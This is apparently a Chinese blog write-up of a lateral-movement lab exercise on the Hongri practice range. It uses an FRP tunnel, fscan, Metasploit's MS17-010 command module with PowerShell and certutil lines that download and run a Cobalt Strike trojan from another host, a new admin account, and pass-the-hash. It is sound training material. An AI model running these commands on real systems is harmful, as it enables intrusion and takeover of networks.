+<p>上传 FRP 至靶机后查看文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.12.26.png" alt="截屏2022-05-22 17.12.26"></p>
+<p>在 CS 上启动连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.13.43.png" alt="截屏2022-05-22 17.13.43"></p>
+<p>在本地设置 proxychains 连接目标的6000端口建立 FRP 隧道</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/etc/proxychains.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">配置</span></span><br><span class="line">socks5 x.x.x.x 6000</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.28.19.png" alt="截屏2022-05-22 17.28.19"></p>
+<p>使用 nmap 扫描内网主机进行测试，连接成功说明隧道建立成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap 192.168.52.138 -p 135,445,80</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.25.07.png" alt="截屏2022-05-22 17.25.07"></p>
+<h3 id="MSF永恒之蓝漏洞利用"><a href="#MSF永恒之蓝漏洞利用" class="headerlink" title="MSF永恒之蓝漏洞利用"></a>MSF永恒之蓝漏洞利用</h3><h4 id="FSCAN漏洞扫描"><a href="#FSCAN漏洞扫描" class="headerlink" title="FSCAN漏洞扫描"></a>FSCAN漏洞扫描</h4><p>在 CS 中上传 fsacn 并设置扫描目标</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># hosts.txt</span></span></span><br><span class="line">192.168.52.138</span><br><span class="line">192.168.52.141</span><br><span class="line">192.168.52.143</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.49.14.png" alt="截屏2022-05-22 17.49.14"></p>
+<p>使用 fscan 扫描目标，结果显示全部目标都存在 MS17-010 漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell fscan64.exe -hf hosts.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.53.05.png" alt="截屏2022-05-22 17.53.05"></p>
+<h4 id="域控主机上线CS"><a href="#域控主机上线CS" class="headerlink" title="域控主机上线CS"></a>域控主机上线CS</h4><p>在 CS 的会话当中设置新的监听器用于上线内网主机</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2017.59.14.png" alt="截屏2022-05-22 17.59.14"></p>
+<p>需要注意的是在设置监听器时需要确认内网代理主机的IP地址，否则会导致内网主机无法连接</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.00.22.png" alt="截屏2022-05-22 18.00.22"></p>
+<p>借用该监听器生成相应木马<code>mac2.exe</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.06.45.png" alt="截屏2022-05-22 18.06.45"></p>
+<p>成功将该木马上传至目标的站点目录<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.09.21.png" alt="截屏2022-05-22 18.09.21"></p>
+<p>在本地开启 MSF 并设置代理</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; setg Proxies socks5:x.x.x.x:6000</span><br><span class="line">msf &gt; setg ReverseAllowProxy true</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.13.35.png" alt="截屏2022-05-22 18.13.35"></p>
+<p>使用 MSF 执行命令上线 CS</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">msf &gt; set command &quot;powershell.exe -Command (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.52.143/mac2.exe&#x27;,&#x27;mac2.exe&#x27;);start-process mac2.exe&quot;</span><br><span class="line">msf &gt; set rhosts 192.168.52.138</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.21.18.png" alt="截屏2022-05-22 18.21.18"></p>
+<p>域控主机成功上线CS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2018.21.33.png" alt="截屏2022-05-22 18.21.33"></p>
+<h4 id="域内主机上线CS"><a href="#域内主机上线CS" class="headerlink" title="域内主机上线CS"></a>域内主机上线CS</h4><p>在使用 MS17-010 攻击域内主机时 CS 无法上线，这是因为该主机为 Windows Server 2003，我们无法使用 powershell 执行命令，与此同时该操作系统为 X86 架构，对应需要使用32位的木马。因此我们需要使用 CS 生成32位木马<code>mac3.exe</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2019.41.01.png" alt="截屏2022-05-22 19.41.01"></p>
+<p>同样地我们将其上传至目标的站点目录<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2019.42.36.png" alt="截屏2022-05-22 19.42.36"></p>
+<p>重新设置命令使用 certutil 下载木马，但是目标返回报错信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; set command &quot;certutil.exe -urlcache -split -f http://192.168.52.143/mac3.exe mac3.exe&quot;</span><br><span class="line">msf &gt; set rhosts 192.168.52.141</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2020.19.41.png" alt="截屏2022-05-22 20.19.41"></p>
+<p>那么我们换一种思路，尝试通过永恒之蓝创建管理员账户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user mac QWEasd123 /add</span><br><span class="line">net localgroup &quot;administrators&quot; mac /add</span><br><span class="line">net user mac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2020.29.43.png" alt="截屏2022-05-22 20.29.43"></p>
+<p>尝试使用新建管理员通过<code>IPC$</code>进行连接，但目标无法连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.52.141\ipc$ &quot;QWEasd123&quot; /user:mac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2020.35.42.png" alt="截屏2022-05-22 20.35.42"></p>
+<p>尝试使用域管理员进行登录，目标连接成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.52.141\ipc$ &quot;Mac123456&quot; /user:Administrator</span><br><span class="line">shell net use</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.14.02.png" alt="截屏2022-05-22 21.14.02"></p>
+<p>将木马复制到域内主机的C盘目录当中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell cd .. &amp;&amp; copy mac3.exe \\192.168.52.141\c$</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.18.54.png" alt="截屏2022-05-22 21.18.54"></p>
+<p>在 MSF 中通过 MS17-010 执行木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; set command &quot;C:\\mac3.exe&quot;</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.22.49.png" alt="截屏2022-05-22 21.22.49"></p>
+<p>域内主机成功上线CS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.23.49.png" alt="截屏2022-05-22 21.23.49"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.32.17.png" alt="截屏2022-05-22 21.32.17"></p>
+<h3 id="域管理员凭证传递利用"><a href="#域管理员凭证传递利用" class="headerlink" title="域管理员凭证传递利用"></a>域管理员凭证传递利用</h3><h4 id="凭证传递利用原理"><a href="#凭证传递利用原理" class="headerlink" title="凭证传递利用原理"></a>凭证传递利用原理</h4><p>通过域管理员的凭证可以快速拿下目标域环境，在 CS 中还给我们提供了 SMB Beacon，它主要通过 SMB 协议建立连接，使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 会从父 Beacon 获取到任务并发送。因为链接的 Beacon 使用 Windows 命名管道进行通信，因此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效。</p>
+<h4 id="凭证传递上线CS"><a href="#凭证传递上线CS" class="headerlink" title="凭证传递上线CS"></a>凭证传递上线CS</h4><p>在 CS 的会话中建立 SMB 监听器用于快速传递凭证<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.51.39.png" alt="截屏2022-05-22 21.51.39"></p>
+<p>在<code>Targets</code>中选择 psexec_psh 传递哈希值<br>!<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.58.18.png" alt="截屏2022-05-22 21.58.18"></p>
+<p>选择会话并设置 SMB 监听器<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2021.56.37.png" alt="截屏2022-05-22 21.56.37"></p>
+<p>域控主机成功上线CS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2022.00.10.png" alt="截屏2022-05-22 22.00.10"></p>
+<p>同样利用该方法无法上线域内主机，这主要是因为目标没有 powershell 环境，我们可以通过 psexec 方式来传递哈希<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2022.08.04.png" alt="截屏2022-05-22 22.08.04"></p>
+<p>域内主机成功上线CS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2022.05.52.png" alt="截屏2022-05-22 22.05.52"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2022.09.14.png" alt="截屏2022-05-22 22.09.14"></p>
+<h2 id="0x05-靶场学习总结"><a href="#0x05-靶场学习总结" class="headerlink" title="0x05 靶场学习总结"></a>0x05 靶场学习总结</h2><p>这是我第二次做该靶场，第一次做的时候只采用了凭证传递的利用方式，并没有考虑 MS17-010 漏洞利用，也没有采用隧道的方式来访问内网，经过这些天的考虑后我决定重做温习一遍，一是重新整理一下思路；二是锻炼一下内网渗透思路。当然在练习过程中我也遇到了许多问题，比如 certutil.exe 怎么无法在 Windows Server 2003 中传递保存木马文件、FTP 匿名登录漏洞如何通过代理登录利用等，显然这些问题在打靶记录中未直接体现。但它们对渗透思路的打磨有很大帮助。同时非常感谢红日团队以及前辈的实践，我将继续对后续靶场进行研究学习。</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/2634d38d/">流量加密之C2隐藏<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
